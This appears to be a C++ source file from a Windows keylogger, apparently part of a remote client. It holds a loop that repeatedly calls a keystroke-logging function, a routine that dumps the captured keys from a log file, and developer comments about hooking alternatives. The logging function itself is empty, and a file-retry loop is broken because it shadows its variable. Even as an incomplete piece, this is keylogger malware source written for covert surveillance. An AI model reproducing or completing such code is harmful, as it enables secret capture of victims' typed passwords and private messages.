#pragma once
#include "keylogger.h"
#include "settings.h"

#include <string>
#include <Windows.h>

void Keylogger::startLogger()
{
	while (true)
	{
		logger();
		Sleep(10);
	}
}

std::string Keylogger::dumpKeys()
{
	std::ifstream stream(Settings::keylogPath);
	//Just in case you cannot get an handle to the file for any reason
	while(!stream)
		std::ifstream stream(Settings::keylogPath);

	std::string keys((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
	return keys;
}

/*
Not sure if i want to repeatedly call functions 24/7 in the client, have to look into a version with hooks and winapi (message loop)
constantly opens and closes a file 100x per second. really not optimal

*/
void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/keylogger/blob/master/src/main.cpp
{

}
